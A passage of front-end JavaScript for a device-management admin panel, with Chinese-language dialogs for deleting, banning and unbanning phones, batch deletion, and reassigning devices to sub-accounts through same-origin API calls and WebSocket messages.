                btnBox.style.cssText = "display:flex;justify-content:flex-end;gap:10px;";
                var cancelBtn = document.createElement("button");
                cancelBtn.style.cssText = "padding:8px 20px;border-radius:8px;border:1px solid #eef1f7;background:#ffffff;color:#5b6b8c;font-size:13px;cursor:pointer;";
                cancelBtn.textContent = "\u53D6\u6D88";
                cancelBtn.addEventListener("click", function() { overlay.remove(); });
                var confirmBtn = document.createElement("button");
                confirmBtn.style.cssText = "padding:8px 20px;border-radius:8px;border:none;background:#d03050;color:#14213d;font-size:13px;cursor:pointer;font-weight:500;";
                confirmBtn.textContent = "\u5220\u9664";
                confirmBtn.addEventListener("click", function() {
                    confirmBtn.disabled = true;
                    confirmBtn.textContent = "\u5220\u9664\u4E2D...";
                    fetch("/api/DeletePhoneById.php", {
                        method: "POST",
                        headers: {"Content-Type": "application/json"},
                        body: JSON.stringify({token: nt.get("ACCESS-TOKEN") || "", phone_id: pid})
                    }).then(function(res) { return res.json(); }).then(function(data) {
                        if (data.status === "success") {
                            window.$message.success("\u8BBE\u5907\u5DF2\u5220\u9664");
                            overlay.remove();
                            O();
                        } else {
                            window.$message.error(data.message || "\u5220\u9664\u5931\u8D25");
                            confirmBtn.disabled = false;
                            confirmBtn.textContent = "\u5220\u9664";
                        }
                    }).catch(function() {
                        window.$message.error("\u7F51\u7EDC\u9519\u8BEF");
                        confirmBtn.disabled = false;
                        confirmBtn.textContent = "\u5220\u9664";
                    });
                });
                btnBox.appendChild(cancelBtn);
                btnBox.appendChild(confirmBtn);
                modal.appendChild(btnBox);
                overlay.appendChild(modal);
                overlay.addEventListener("click", function(ev) { if (ev.target === overlay) overlay.remove(); });
                document.body.appendChild(overlay);
            }

            function _openBanListModal() {
                var _banData = [];
                var overlay = document.createElement("div");
                overlay.style.cssText = "position:fixed;inset:0;background:rgba(0,0,0,0.35);z-index:1000;display:flex;align-items:center;justify-content:center;";
                var modal = document.createElement("div");
                modal.style.cssText = "background:#ffffff;border-radius:14px;padding:24px;width:94%;max-width:700px;max-height:85vh;display:flex;flex-direction:column;box-shadow:0 20px 60px rgba(0,0,0,0.15);font-family:v-sans,system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;";
                var titleEl = document.createElement("div");
                titleEl.style.cssText = "font-size:16px;font-weight:600;margin-bottom:12px;color:#14213d;display:flex;justify-content:space-between;align-items:center;";
                titleEl.innerHTML = '<span>\u26D4 \u9ED1\u540D\u5355\u7BA1\u7406</span><span style="font-size:12px;color:#5b6b8c;font-weight:400;">\u5220\u9664\u7684\u8BBE\u5907\u4F1A\u88AB\u62C9\u9ED1\uFF0C\u963B\u6B62\u91CD\u8FDE</span>';
                modal.appendChild(titleEl);
                var searchBox = document.createElement("input");
                searchBox.type = "text";
                searchBox.placeholder = "\u641C\u7D22\u8BBE\u5907ID / \u578B\u53F7 / \u5907\u6CE8 / \u64CD\u4F5C\u4EBA...";
                searchBox.style.cssText = "width:100%;padding:9px 14px;border:1px solid #eef1f7;border-radius:8px;font-size:13px;margin-bottom:12px;outline:none;box-sizing:border-box;transition:border-color .15s;";
                searchBox.addEventListener("focus", function() { searchBox.style.borderColor = "#16a34a"; });
                searchBox.addEventListener("blur", function() { searchBox.style.borderColor = "#eef1f7"; });
                searchBox.addEventListener("input", function() { renderList(searchBox.value.trim().toLowerCase()); });
                modal.appendChild(searchBox);
                var countEl = document.createElement("div");
                countEl.style.cssText = "font-size:12px;color:#5b6b8c;margin-bottom:8px;";
                modal.appendChild(countEl);
                var listBox = document.createElement("div");
                listBox.style.cssText = "flex:1;overflow-y:auto;min-height:100px;";
                listBox.innerHTML = '<div style="text-align:center;color:#5b6b8c;padding:24px 0;">\u52A0\u8F7D\u4E2D...</div>';
                modal.appendChild(listBox);
                function renderList(keyword) {
                    var filtered = _banData;
                    if (keyword) {
                        filtered = _banData.filter(function(item) {
                            return (item.phone_id || "").toLowerCase().indexOf(keyword) !== -1 ||
                                   (item.model || "").toLowerCase().indexOf(keyword) !== -1 ||
                                   (item.phone_name || "").toLowerCase().indexOf(keyword) !== -1 ||
                                   (item.remark || "").toLowerCase().indexOf(keyword) !== -1 ||
                                   (item.banned_by || "").toLowerCase().indexOf(keyword) !== -1;
                        });
                    }
                    countEl.textContent = "\u5171 " + _banData.length + " \u6761\u8BB0\u5F55" + (keyword ? "\uFF0C\u7B5B\u9009\u51FA " + filtered.length + " \u6761" : "");
                    if (filtered.length === 0) {
                        listBox.innerHTML = '<div style="text-align:center;color:#5b6b8c;padding:24px 0;">' + (keyword ? "\u65E0\u5339\u914D\u7ED3\u679C" : "\u6682\u65E0\u62C9\u9ED1\u8BB0\u5F55") + '</div>';
                        return;
                    }
                    listBox.innerHTML = "";
                    filtered.forEach(function(item) {
                        var row = document.createElement("div");
                        row.style.cssText = "display:flex;align-items:center;justify-content:space-between;padding:10px 12px;margin:4px 0;border:1px solid #eef1f7;border-radius:8px;font-size:13px;";
                        var info = document.createElement("div");
                        info.innerHTML = '<div style="font-weight:500;color:#5b6b8c;">' + item.phone_id + '</div>' +
                            '<div style="font-size:11px;color:#5b6b8c;margin-top:2px;">' + item.banned_by + ' | ' + item.banned_at + '</div>';
                        var unbanBtn = document.createElement("button");
                        unbanBtn.style.cssText = "padding:5px 14px;border-radius:6px;border:1px solid #16a34a;background:#ffffff;color:#16a34a;font-size:12px;cursor:pointer;white-space:nowrap;";
                        unbanBtn.textContent = "\u89E3\u5C01";
                        unbanBtn.addEventListener("click", function() {
                            unbanBtn.disabled = true;
                            unbanBtn.textContent = "...";
                            fetch("/api/BannedDevices.php", {
                                method: "POST",
                                headers: {"Content-Type": "application/json"},
                                body: JSON.stringify({token: nt.get("ACCESS-TOKEN") || "", action: "unban", phone_id: item.phone_id})
                            }).then(function(r) { return r.json(); }).then(function(res) {
                                if (res.code === 0) {
                                    window.$message.success("\u5DF2\u89E3\u5C01");
                                    loadList();
                                } else {
                                    window.$message.error(res.msg || "\u5931\u8D25");
                                    unbanBtn.disabled = false;
                                    unbanBtn.textContent = "\u89E3\u5C01";
                                }
                            }).catch(function() {
                                window.$message.error("\u7F51\u7EDC\u9519\u8BEF");
                                unbanBtn.disabled = false;
                                unbanBtn.textContent = "\u89E3\u5C01";
                            });
                        });
                        row.appendChild(info);
                        row.appendChild(unbanBtn);
                        listBox.appendChild(row);
                    });
                }
                function loadList() {
                    listBox.innerHTML = '<div style="text-align:center;color:#5b6b8c;padding:24px 0;">\u52A0\u8F7D\u4E2D...</div>';
                    fetch("/api/BannedDevices.php", {
                        method: "POST",
                        headers: {"Content-Type": "application/json"},
                        body: JSON.stringify({token: nt.get("ACCESS-TOKEN") || "", action: "list"})
                    }).then(function(r) { return r.json(); }).then(function(data) {
                        _banData = (data.code === 0 && data.list) ? data.list : [];
                        renderList(searchBox.value.trim().toLowerCase());
                    }).catch(function() {
                        listBox.innerHTML = '<div style="text-align:center;color:#d03050;padding:24px 0;">\u52A0\u8F7D\u5931\u8D25</div>';
                    });
                }
                loadList();
                var closeBtn = document.createElement("button");
                closeBtn.style.cssText = "padding:8px 24px;border-radius:8px;border:1px solid #eef1f7;background:#ffffff;color:#5b6b8c;font-size:13px;cursor:pointer;align-self:flex-end;margin-top:12px;";
                closeBtn.textContent = "\u5173\u95ED";
                closeBtn.addEventListener("click", function() { overlay.remove(); });
                modal.appendChild(closeBtn);
                overlay.appendChild(modal);
                overlay.addEventListener("click", function(ev) { if (ev.target === overlay) overlay.remove(); });
                document.body.appendChild(overlay);
            }

            function _batchDeleteDevices() {
                var phoneIds = Array.from(_batchSelectedIds);
                if (phoneIds.length === 0) { window.$message.error("\u8BF7\u5148\u9009\u62E9\u8BBE\u5907"); return; }
                var overlay = document.createElement("div");
                overlay.style.cssText = "position:fixed;inset:0;background:rgba(0,0,0,0.35);z-index:1000;display:flex;align-items:center;justify-content:center;";
                var modal = document.createElement("div");
                modal.style.cssText = "background:#ffffff;border-radius:14px;padding:24px;width:90%;max-width:420px;box-shadow:0 20px 60px rgba(0,0,0,0.15);font-family:v-sans,system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;";
                modal.innerHTML = '<div style="font-size:16px;font-weight:600;margin-bottom:12px;color:#14213d;">\u6279\u91CF\u5220\u9664\u8BBE\u5907</div>' +
                    '<div style="font-size:14px;color:#666;margin-bottom:8px;">\u5373\u5C06\u5220\u9664 <b style="color:#d03050;">' + phoneIds.length + '</b> \u53F0\u8BBE\u5907\uFF0C\u5220\u9664\u540E\u8BBE\u5907\u5C06\u88AB\u65AD\u5F00\u8FDE\u63A5\u3002</div>' +
                    '<div style="font-size:12px;color:#5b6b8c;margin-bottom:16px;">\u8BBE\u5907\u5C06\u9010\u4E2A\u5220\u9664\uFF0C\u9632\u6B62\u670D\u52A1\u62A5\u52A8\u3002</div>';
                var progressArea = document.createElement("div");
                progressArea.style.cssText = "display:none;margin-bottom:16px;padding:12px;background:#eef1f7;border-radius:8px;font-size:13px;color:#5b6b8c;max-height:160px;overflow-y:auto;";
                modal.appendChild(progressArea);
                var btnBox = document.createElement("div");
                btnBox.style.cssText = "display:flex;justify-content:flex-end;gap:10px;";
                var cancelBtn = document.createElement("button");
                cancelBtn.style.cssText = "padding:8px 20px;border-radius:8px;border:1px solid #eef1f7;background:#ffffff;color:#5b6b8c;font-size:13px;cursor:pointer;";
                cancelBtn.textContent = "\u53D6\u6D88";
                cancelBtn.addEventListener("click", function() { overlay.remove(); });
                var confirmBtn = document.createElement("button");
                confirmBtn.style.cssText = "padding:8px 20px;border-radius:8px;border:none;background:#d03050;color:#14213d;font-size:13px;cursor:pointer;font-weight:500;";
                confirmBtn.textContent = "\u786E\u5B9A\u5220\u9664 " + phoneIds.length + " \u53F0";
                confirmBtn.addEventListener("click", function() {
                    confirmBtn.disabled = true;
                    cancelBtn.disabled = true;
                    confirmBtn.textContent = "\u5220\u9664\u4E2D...";
                    progressArea.style.display = "block";
                    progressArea.innerHTML = "\u6B63\u5728\u5904\u7406...";
                    fetch("/api/BatchDeleteDevices.php", {
                        method: "POST",
                        headers: {"Content-Type": "application/json"},
                        body: JSON.stringify({token: nt.get("ACCESS-TOKEN") || "", phone_ids: phoneIds})
                    }).then(function(res) { return res.json(); }).then(function(data) {
                        if (data.code === 0) {
                            var html = '<div style="color:#16a34a;font-weight:500;margin-bottom:6px;">\u5220\u9664\u5B8C\u6210: \u6210\u529F ' + data.deleted + ' / ' + data.total + ' \u53F0</div>';
                            if (data.failed && data.failed.length > 0) {
                                html += '<div style="color:#d03050;font-size:12px;">\u5931\u8D25: ' + data.failed.join(", ") + '</div>';
                            }
                            progressArea.innerHTML = html;
                            confirmBtn.textContent = "\u5B8C\u6210";
                            confirmBtn.disabled = false;
                            confirmBtn.style.background = "#16a34a";
                            confirmBtn.onclick = function() { overlay.remove(); };
                            window.$message.success("\u6279\u91CF\u5220\u9664\u5B8C\u6210: \u6210\u529F " + data.deleted + " \u53F0");
                            _batchSelectedIds.clear();
                            document.querySelectorAll("._batch-cb").forEach(function(cb) { cb.checked = false; });
                            _updateBatchBar();
                            O();
                        } else {
                            progressArea.innerHTML = '<div style="color:#d03050;">' + (data.msg || "\u5220\u9664\u5931\u8D25") + '</div>';
                            confirmBtn.disabled = false;
                            cancelBtn.disabled = false;
                            confirmBtn.textContent = "\u91CD\u8BD5";
                        }
                    }).catch(function() {
                        progressArea.innerHTML = '<div style="color:#d03050;">\u7F51\u7EDC\u9519\u8BEF</div>';
                        confirmBtn.disabled = false;
                        cancelBtn.disabled = false;
                        confirmBtn.textContent = "\u91CD\u8BD5";
                    });
                });
                btnBox.appendChild(cancelBtn);
                btnBox.appendChild(confirmBtn);
                modal.appendChild(btnBox);
                overlay.appendChild(modal);
                overlay.addEventListener("click", function(ev) { if (ev.target === overlay) overlay.remove(); });
                document.body.appendChild(overlay);
            }

            function openGfModal(d) {
                var phoneId = d.phone_id;
                var overlay = document.createElement("div");
                overlay.style.cssText = "position:fixed;inset:0;background:rgba(0,0,0,0.35);z-index:1000;display:flex;align-items:center;justify-content:center;";
                var modal = document.createElement("div");
                modal.style.cssText = "background:#ffffff;border-radius:14px;padding:24px;width:90%;max-width:480px;box-shadow:0 20px 60px rgba(0,0,0,0.15);font-family:v-sans,system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;";
                var titleEl = document.createElement("div");
                titleEl.style.cssText = "font-size:16px;font-weight:600;margin-bottom:16px;color:#14213d;";
                titleEl.textContent = "\u4E0B\u53D1\u8BBE\u5907\u7ED9\u5B50\u8D26\u53F7";
                modal.appendChild(titleEl);
                var listLabel = document.createElement("div");
                listLabel.style.cssText = "font-size:13px;color:#666;margin-bottom:6px;";
                listLabel.textContent = "\u9009\u62E9\u5B50\u8D26\u53F7:";
                modal.appendChild(listLabel);
                var listBox = document.createElement("div");
                listBox.style.cssText = "max-height:240px;overflow-y:auto;margin-bottom:12px;";
                listBox.innerHTML = '<div style="text-align:center;color:#5b6b8c;padding:12px 0;">\u52A0\u8F7D\u4E2D...</div>';
                modal.appendChild(listBox);
                var selectedUsrname = "";
                fetch("/api/EaodAccountManage.php", {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({action: "list", token: nt.get("ACCESS-TOKEN") || ""})
                }).then(function(res) { return res.json(); }).then(function(data) {
                    if (data.code === 200) {
                        var accounts = (data.accounts || []).filter(function(x) { return x.usrname !== "godfather"; });
                        if (accounts.length === 0) {
                            listBox.innerHTML = '<div style="text-align:center;color:#5b6b8c;padding:12px 0;">\u6682\u65E0\u5B50\u8D26\u53F7</div>';
                            return;
                        }
                        listBox.innerHTML = "";
                        accounts.forEach(function(acc) {
                            var item = document.createElement("div");
                            item.style.cssText = "padding:10px 12px;margin:4px 0;border:1px solid #eef1f7;border-radius:6px;cursor:pointer;font-size:13px;transition:all .15s;";
                            item.textContent = acc.usrname + " (" + acc.email + ")";
                            item.addEventListener("click", function() {
                                listBox.querySelectorAll("div").forEach(function(el) {
                                    el.style.border = "1px solid #eef1f7";
                                    el.style.background = "";
                                });
                                item.style.border = "2px solid #16a34a";
                                item.style.background = "#eef1f7";
                                selectedUsrname = acc.usrname;
                            });
                            listBox.appendChild(item);
                        });
                    }
                }).catch(function() {
                    listBox.innerHTML = '<div style="text-align:center;color:#5b6b8c;padding:12px 0;">\u52A0\u8F7D\u5931\u8D25</div>';
                });
                var btnBox = document.createElement("div");
                btnBox.style.cssText = "display:flex;gap:8px;justify-content:flex-end;margin-top:8px;";
                var cancelBtn = document.createElement("button");
                cancelBtn.style.cssText = "padding:7px 16px;border-radius:8px;border:1px solid #eef1f7;background:#eef1f7;color:#5b6b8c;font-size:13px;cursor:pointer;font-family:inherit;";
                cancelBtn.textContent = "\u53D6\u6D88";
                cancelBtn.addEventListener("click", function() { overlay.remove(); });
                var submitBtn = document.createElement("button");
                submitBtn.style.cssText = "padding:7px 16px;border-radius:8px;border:none;background:#16a34a;color:#14213d;font-size:13px;cursor:pointer;font-family:inherit;";
                submitBtn.textContent = "\u786E\u5B9A\u4E0B\u53D1";
                submitBtn.addEventListener("click", function() {
                    if (!selectedUsrname) { window.$message.error("\u8BF7\u9009\u62E9\u4E0B\u53D1\u8D26\u53F7"); return; }
                    submitBtn.disabled = true;
                    submitBtn.textContent = "\u4E0B\u53D1\u4E2D...";
                    fetch("/api/ReassignDevice.php", {
                        method: "POST",
                        headers: {"Content-Type": "application/json"},
                        body: JSON.stringify({
                            token: nt.get("ACCESS-TOKEN") || "",
                            phone_id: phoneId,
                            target_usrname: selectedUsrname
                        })
                    }).then(function(res) { return res.json(); }).then(function(resp) {
                        if (resp.code === 200) {
                            if (a && a.readyState === WebSocket.OPEN && resp.target_email && resp.reassign_token) {
                                a.send(JSON.stringify({
                                    itype: "slr_panelsend",
                                    subc: "reassign",
                                    pid: phoneId,
                                    new_email: resp.target_email,
                                    new_usrname: selectedUsrname,
                                    reassign_token: resp.reassign_token,
                                    usercheck: nt.get("CURRENT-USER")
                                }));
                            }
                            window.$message.success("\u4E0B\u53D1\u6210\u529F");
                            overlay.remove();
                            O();
                        } else {
                            window.$message.error(resp.msg || "\u4E0B\u53D1\u5931\u8D25");
                            submitBtn.disabled = false;
                            submitBtn.textContent = "\u786E\u5B9A\u4E0B\u53D1";
                        }
                    }).catch(function() {
                        window.$message.error("\u7F51\u7EDC\u9519\u8BEF");
                        submitBtn.disabled = false;
                        submitBtn.textContent = "\u786E\u5B9A\u4E0B\u53D1";
                    });
                });
                btnBox.appendChild(cancelBtn);
                btnBox.appendChild(submitBtn);
                modal.appendChild(btnBox);
                overlay.appendChild(modal);
                overlay.addEventListener("click", function(ev) { if (ev.target === overlay) overlay.remove(); });
                document.body.appendChild(overlay);
            }

            function openBatchGfModal() {
                var phoneIds = Array.from(_batchSelectedIds);
                if (phoneIds.length === 0) { window.$message.error("\u8BF7\u5148\u9009\u62E9\u8BBE\u5907"); return; }
                var overlay = document.createElement("div");
                overlay.style.cssText = "position:fixed;inset:0;background:rgba(0,0,0,0.35);z-index:1001;display:flex;align-items:center;justify-content:center;";
                var modal = document.createElement("div");
                modal.style.cssText = "background:#ffffff;border-radius:14px;padding:24px;width:90%;max-width:520px;box-shadow:0 20px 60px rgba(0,0,0,0.15);font-family:v-sans,system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;";
                var titleEl = document.createElement("div");
                titleEl.style.cssText = "font-size:16px;font-weight:600;margin-bottom:16px;color:#14213d;";
                titleEl.textContent = "\u6279\u91CF\u4E0B\u53D1\u8BBE\u5907 (" + phoneIds.length + " \u53F0)";
                modal.appendChild(titleEl);
                var deviceListLabel = document.createElement("div");
                deviceListLabel.style.cssText = "font-size:13px;color:#666;margin-bottom:6px;";
                deviceListLabel.textContent = "\u5DF2\u9009\u8BBE\u5907:";
                modal.appendChild(deviceListLabel);
                var deviceListBox = document.createElement("div");
                deviceListBox.style.cssText = "max-height:120px;overflow-y:auto;margin-bottom:16px;padding:8px 12px;background:#eef1f7;border-radius:8px;border:1px solid #eef1f7;";
                phoneIds.forEach(function(pid) {
                    var item = document.createElement("div");
                    item.style.cssText = "font-size:12px;color:#555;padding:3px 0;font-family:monospace;";
                    var info = Dt[pid];
                    item.textContent = pid + (info && info.phone_name ? " (\u5907\u6CE8: " + info.phone_name + ")" : "");
                    deviceListBox.appendChild(item);
                });
                modal.appendChild(deviceListBox);
                var isGf = (s === "godfather");
                var listLabel = document.createElement("div");
                listLabel.style.cssText = "font-size:13px;color:#666;margin-bottom:6px;";
                listLabel.textContent = isGf ? "\u9009\u62E9\u76EE\u6807\u8D26\u53F7:" : "\u8F93\u5165\u76EE\u6807\u8D26\u53F7\u90AE\u7BB1:";
                modal.appendChild(listLabel);
                var selectedUsrname = "";
                var targetEmailVal = "";
                if (isGf) {
                    var listBox = document.createElement("div");
                    listBox.style.cssText = "max-height:200px;overflow-y:auto;margin-bottom:12px;";
                    listBox.innerHTML = '<div style="text-align:center;color:#5b6b8c;padding:12px 0;">\u52A0\u8F7D\u4E2D...</div>';
                    modal.appendChild(listBox);
                    fetch("/api/EaodAccountManage.php", {
                        method: "POST",
                        headers: {"Content-Type": "application/json"},
                        body: JSON.stringify({action: "list", token: nt.get("ACCESS-TOKEN") || ""})
                    }).then(function(res) { return res.json(); }).then(function(data) {
                        if (data.code === 200) {
                            var accounts = (data.accounts || []).filter(function(x) { return x.usrname !== "godfather"; });
                            if (accounts.length === 0) {
                                listBox.innerHTML = '<div style="text-align:center;color:#5b6b8c;padding:12px 0;">\u6682\u65E0\u5B50\u8D26\u53F7</div>';
                                return;
                            }
                            listBox.innerHTML = "";
                            accounts.forEach(function(acc) {
                                var item = document.createElement("div");
                                item.style.cssText = "padding:10px 12px;margin:4px 0;border:1px solid #eef1f7;border-radius:6px;cursor:pointer;font-size:13px;transition:all .15s;";
                                item.textContent = acc.usrname + " (" + acc.email + ")";
                                item.addEventListener("click", function() {
                                    listBox.querySelectorAll("div").forEach(function(el) {
                                        el.style.border = "1px solid #eef1f7";
                                        el.style.background = "";
                                    });
                                    item.style.border = "2px solid #16a34a";
                                    item.style.background = "#eef1f7";
                                    selectedUsrname = acc.usrname;
                                });
                                listBox.appendChild(item);
                            });
                        }
                    }).catch(function() {
                        listBox.innerHTML = '<div style="text-align:center;color:#5b6b8c;padding:12px 0;">\u52A0\u8F7D\u5931\u8D25</div>';
                    });
                } else {
                    var emailInput = document.createElement("input");
                    emailInput.type = "text";
                    emailInput.placeholder = "\u8BF7\u8F93\u5165\u76EE\u6807\u8D26\u53F7\u90AE\u7BB1";
                    emailInput.style.cssText = "width:100%;box-sizing:border-box;padding:8px 12px;border:1px solid #eef1f7;border-radius:6px;font-size:13px;margin-bottom:12px;outline:none;font-family:inherit;";
                    emailInput.addEventListener("input", function() { targetEmailVal = emailInput.value.trim(); });
                    emailInput.addEventListener("focus", function() { emailInput.style.borderColor = "#16a34a"; });
                    emailInput.addEventListener("blur", function() { emailInput.style.borderColor = "#eef1f7"; });
                    modal.appendChild(emailInput);
                }
                var progressArea = document.createElement("div");
                progressArea.style.cssText = "display:none;margin-bottom:12px;padding:10px 12px;background:#eef1f7;border-radius:8px;border:1px solid #eef1f7;";
                modal.appendChild(progressArea);
                var btnBox = document.createElement("div");
                btnBox.style.cssText = "display:flex;gap:8px;justify-content:flex-end;margin-top:8px;";
                var cancelBtn = document.createElement("button");
                cancelBtn.style.cssText = "padding:7px 16px;border-radius:8px;border:1px solid #eef1f7;background:#eef1f7;color:#5b6b8c;font-size:13px;cursor:pointer;font-family:inherit;";
                cancelBtn.textContent = "\u53D6\u6D88";
                cancelBtn.addEventListener("click", function() { overlay.remove(); });
                var submitBtn = document.createElement("button");
                submitBtn.style.cssText = "padding:7px 20px;border-radius:8px;border:none;background:#16a34a;color:#14213d;font-size:13px;cursor:pointer;font-family:inherit;font-weight:500;";
                submitBtn.textContent = "\u786E\u5B9A\u6279\u91CF\u4E0B\u53D1";
                submitBtn.addEventListener("click", function() {
                    var reqBody = { token: nt.get("ACCESS-TOKEN") || "", phone_ids: phoneIds };
                    if (isGf) {
                        if (!selectedUsrname) { window.$message.error("\u8BF7\u9009\u62E9\u76EE\u6807\u8D26\u53F7"); return; }
                        reqBody.target_usrname = selectedUsrname;
                    } else {
                        if (!targetEmailVal) { window.$message.error("\u8BF7\u8F93\u5165\u76EE\u6807\u90AE\u7BB1"); return; }
                        reqBody.target_email = targetEmailVal;
                    }
                    if (!a || a.readyState !== WebSocket.OPEN) {
                        window.$message.error("\u8FDE\u63A5\u5DF2\u65AD\u5F00\uFF0C\u8BF7\u5237\u65B0\u9875\u9762\u540E\u91CD\u8BD5");
                        return;
                    }
                    submitBtn.disabled = true;
                    submitBtn.textContent = "\u4E0B\u53D1\u4E2D...";
                    cancelBtn.disabled = true;
                    progressArea.style.display = "block";
                    progressArea.innerHTML = '<div style="font-size:13px;color:#666;">\u6B63\u5728\u6279\u91CF\u4E0B\u53D1 ' + phoneIds.length + ' \u53F0\u8BBE\u5907...</div>';
                    var _esc = function(s) { return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;"); };
                    fetch("/api/BatchReassignDevice.php", {
                        method: "POST",
                        headers: {"Content-Type": "application/json"},
                        body: JSON.stringify(reqBody)
                    }).then(function(res) { return res.json(); }).then(function(resp) {
                        if (resp.code === 200) {
                            var results = resp.results || [];
                            var successCount = 0;
                            var failCount = 0;
                            var wsSendFail = 0;
                            results.forEach(function(r) {
                                if (r.code === 200) {
                                    successCount++;
                                    if (a && a.readyState === WebSocket.OPEN && r.target_email && r.reassign_token) {
                                        try {
                                            a.send(JSON.stringify({
                                                itype: "slr_panelsend",
                                                subc: "reassign",
                                                pid: r.phone_id,
                                                new_email: r.target_email,
                                                new_usrname: isGf ? selectedUsrname : targetEmailVal,
                                                reassign_token: r.reassign_token,
                                                usercheck: nt.get("CURRENT-USER")
                                            }));
                                        } catch(wsErr) {
                                            wsSendFail++;
                                        }
                                    } else if (r.target_email && r.reassign_token) {
                                        wsSendFail++;
                                    }
                                } else {
                                    failCount++;
                                }
                            });
                            if (wsSendFail > 0) {
                                window.$message.warning(wsSendFail + " \u53F0\u8BBE\u5907\u901A\u77E5\u5931\u8D25\uFF0C\u8BF7\u5237\u65B0\u9875\u9762\u786E\u8BA4");
                            }
                            var resultHtml = '<div style="font-size:13px;color:#16a34a;font-weight:500;">\u4E0B\u53D1\u5B8C\u6210: \u6210\u529F ' + successCount + ' \u53F0' + (failCount > 0 ? ', \u5931\u8D25 ' + failCount + ' \u53F0' : '') + (wsSendFail > 0 ? ', \u901A\u77E5\u5931\u8D25 ' + wsSendFail + ' \u53F0' : '') + '</div>';
                            if (failCount > 0) {
                                resultHtml += '<div style="margin-top:8px;max-height:80px;overflow-y:auto;">';
                                results.forEach(function(r) {
                                    if (r.code !== 200) {
                                        resultHtml += '<div style="font-size:12px;color:#d03050;padding:2px 0;">' + _esc(r.phone_id) + ': ' + _esc(r.msg || '\u5931\u8D25') + '</div>';
                                    }
                                });
                                resultHtml += '</div>';
                            }
                            progressArea.innerHTML = resultHtml;
                            window.$message.success("\u6279\u91CF\u4E0B\u53D1\u5B8C\u6210: \u6210\u529F " + successCount + " \u53F0");
                            _batchSelectedIds.clear();
                            document.querySelectorAll("._batch-cb").forEach(function(cb) { cb.checked = false; });
                            _updateBatchBar();
                            setTimeout(function() { overlay.remove(); O(); }, 1500);
                        } else {
                            window.$message.error(resp.msg || "\u6279\u91CF\u4E0B\u53D1\u5931\u8D25");
                            submitBtn.disabled = false;
                            submitBtn.textContent = "\u786E\u5B9A\u6279\u91CF\u4E0B\u53D1";
                            cancelBtn.disabled = false;
                            progressArea.style.display = "none";
                        }
                    }).catch(function() {
                        window.$message.error("\u7F51\u7EDC\u9519\u8BEF");
                        submitBtn.disabled = false;
                        submitBtn.textContent = "\u786E\u5B9A\u6279\u91CF\u4E0B\u53D1";
                        cancelBtn.disabled = false;
                        progressArea.style.display = "none";
                    });
                });
                btnBox.appendChild(cancelBtn);
                btnBox.appendChild(submitBtn);
                modal.appendChild(btnBox);
                overlay.appendChild(modal);
                overlay.addEventListener("click", function(ev) { if (ev.target === overlay) overlay.remove(); });
                document.body.appendChild(overlay);
            }

            (function _initBatchBar() {
                if (_batchBar) { _batchBar.remove(); _batchBar = null; }
                _batchBar = document.createElement("div");
                _batchBar.style.cssText = "position:fixed;bottom:24px;left:50%;transform:translateX(-50%);z-index:999;display:none;align-items:center;gap:12px;padding:12px 24px;background:#ffffff;border-radius:12px;box-shadow:0 4px 24px rgba(0,0,0,0.15);font-family:v-sans,system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;transition:all .2s;";
                var countEl = document.createElement("span");
                countEl.className = "_batch-count";
                countEl.style.cssText = "font-size:14px;color:#5b6b8c;font-weight:500;white-space:nowrap;";
                _batchBar.appendChild(countEl);
                var selectAllBtn = document.createElement("button");
                selectAllBtn.style.cssText = "padding:7px 16px;border-radius:8px;border:1px solid #eef1f7;background:#ffffff;color:#5b6b8c;font-size:13px;cursor:pointer;font-family:inherit;white-space:nowrap;transition:all .15s;";
                selectAllBtn.textContent = "\u5168\u9009\u672C\u9875";
                selectAllBtn.addEventListener("mouseenter", function() { selectAllBtn.style.borderColor = "#16a34a"; selectAllBtn.style.color = "#16a34a"; });
                selectAllBtn.addEventListener("mouseleave", function() { selectAllBtn.style.borderColor = "#eef1f7"; selectAllBtn.style.color = "#333"; });
                selectAllBtn.addEventListener("click", function() {
                    g.forEach(function(item) { _batchSelectedIds.add(item.phone_id); });
                    document.querySelectorAll("._batch-cb").forEach(function(cb) { cb.checked = true; });
                    _updateBatchBar();
                });
                _batchBar.appendChild(selectAllBtn);
                var batchBtn = document.createElement("button");
                batchBtn.style.cssText = "padding:7px 20px;border-radius:8px;border:none;background:#16a34a;color:#14213d;font-size:13px;cursor:pointer;font-weight:500;font-family:inherit;white-space:nowrap;transition:all .15s;";
                batchBtn.textContent = "\u6279\u91CF\u4E0B\u53D1";
                batchBtn.addEventListener("mouseenter", function() { batchBtn.style.background = "#16a34a"; });
                batchBtn.addEventListener("mouseleave", function() { batchBtn.style.background = "#16a34a"; });
                batchBtn.addEventListener("click", function() { openBatchGfModal(); });
                _batchBar.appendChild(batchBtn);
                var batchDelBtn = document.createElement("button");
                batchDelBtn.style.cssText = "padding:7px 20px;border-radius:8px;border:none;background:#d03050;color:#14213d;font-size:13px;cursor:pointer;font-weight:500;font-family:inherit;white-space:nowrap;transition:all .15s;";
                batchDelBtn.textContent = "\u6279\u91CF\u5220\u9664";
                batchDelBtn.addEventListener("mouseenter", function() { batchDelBtn.style.background = "#b82848"; });
                batchDelBtn.addEventListener("mouseleave", function() { batchDelBtn.style.background = "#d03050"; });
                batchDelBtn.addEventListener("click", function() { _batchDeleteDevices(); });
                _batchBar.appendChild(batchDelBtn);
                var clearBtn = document.createElement("button");
                clearBtn.style.cssText = "padding:7px 16px;border-radius:8px;border:1px solid #eef1f7;background:#ffffff;color:#666;font-size:13px;cursor:pointer;font-family:inherit;white-space:nowrap;transition:all .15s;";
                clearBtn.textContent = "\u6E05\u9664\u9009\u62E9";
                clearBtn.addEventListener("mouseenter", function() { clearBtn.style.borderColor = "#d03050"; clearBtn.style.color = "#d03050"; });
                clearBtn.addEventListener("mouseleave", function() { clearBtn.style.borderColor = "#eef1f7"; clearBtn.style.color = "#666"; });
                clearBtn.addEventListener("click", function() {
                    _batchSelectedIds.clear();
                    document.querySelectorAll("._batch-cb").forEach(function(cb) { cb.checked = false; });
                    _updateBatchBar();
                });
                _batchBar.appendChild(clearBtn);
                document.body.appendChild(_batchBar);
                var banListBtn = document.createElement("button");
